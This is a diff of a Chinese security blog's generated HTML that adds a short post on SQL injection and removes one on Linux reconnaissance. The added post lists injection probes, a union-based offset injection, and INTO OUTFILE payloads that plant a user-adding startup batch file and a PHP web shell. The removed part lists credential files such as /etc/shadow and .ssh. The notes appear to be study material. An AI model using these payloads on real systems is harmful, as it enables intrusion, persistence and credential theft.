@@ -195,7 +195,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/C-primer/" style="font-size: 16.25px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息搜集/" style="font-size: 11.25px;">信息搜集</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 17.5px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.25px;">基础</a> <a href="/tags/存档/" style="font-size: 11.25px;">存档</a> <a href="/tags/工具/" style="font-size: 18.75px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.5px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 13.75px;">笔记</a> <a href="/tags/笔记-bak/" style="font-size: 10px;">笔记_bak</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.25px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+                        <a href="/tags/C-primer/" style="font-size: 15.71px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息搜集/" style="font-size: 11.43px;">信息搜集</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 17.14px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.43px;">基础</a> <a href="/tags/存档/" style="font-size: 11.43px;">存档</a> <a href="/tags/工具/" style="font-size: 18.57px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 14.29px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.86px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 14.29px;">笔记</a> <a href="/tags/笔记-bak/" style="font-size: 10px;">笔记_bak</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.43px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
                     </div>
                 </section>
                 
@@ -281,6 +281,120 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/sql注入/" class="article-date">
+      <time datetime="2018-12-24T13:55:10.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/sql注入/">sql注入</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>定义： 攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。</li>
+<li>危害：<ol>
+<li>数据库信息泄漏</li>
+<li>网页篡改</li>
+<li>挂马</li>
+<li>服务器被远程控制</li>
+<li>瘫痪全系统</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li>常用sql语句<ul>
+<li>判断数据库<ul>
+<li><code>and exsits(select * from msysobjects)&gt;0</code> access</li>
+<li><code>and exsits(select * from sysobjects)&gt;0</code> sqlserver</li>
+</ul>
+</li>
+<li>判断数据库表<ul>
+<li><code>and exists(select * from admin)</code></li>
+</ul>
+</li>
+<li>判断数据库列名<ul>
+<li><code>and exists(select admin from admin)</code></li>
+</ul>
+</li>
+<li>判断数据字段内容的长度<ul>
+<li><code>and (select len(admin) from admin)=5</code> 如果返回正常说明管理员账户的长度为5</li>
+</ul>
+</li>
+<li>判断数据第一个字符内容<ul>
+<li>and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100 返回正常说明该字符的ascii码值大于100</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>偏移注入<br>偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为<br><code>http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin</code></p>
+</li>
+<li><p>利用注入漏洞执行系统命令</p>
+<ul>
+<li><p>第一种方法： 需要有系统权限<br><code>and 1 = 2 union select 1, &quot;net user seven 123 /add&quot;, 2,3,4 into outfile &#39;C://Documments and Settings/Administrator/[开始] 菜单/程序/启动/1.bat&#39;</code></p>
+</li>
+<li><p>第二种方法<br><code>and 1 = 2 union select 1, &quot;&lt;pre&gt;&lt;body&gt;&lt;?@system($_GET[&#39;cc&#39;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&quot;,3,4,5,6,7 into outfile &#39;C:/Inetpub/wwwroot/mysql-sql/cr.php&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
   
     <article id="post-httpfuzzer" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1129,83 +1243,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-linux基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/linux基本信息收集/" class="article-date">
-      <time datetime="2018-12-15T02:28:21.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/linux基本信息收集/">linux基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>/etc/resolv.conf</li>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-<li>/etc, /usr/local/etc</li>
-<li>.ssh , .gnupg</li>
-<li>/tmp</li>
-<li>whoami, who -a</li>
-<li>ifconfig -a , iptables -L -n , netstat -rn</li>
-<li>uname -a , ps aux</li>
-<li>dpkg -l | head</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
     </div>
 
       
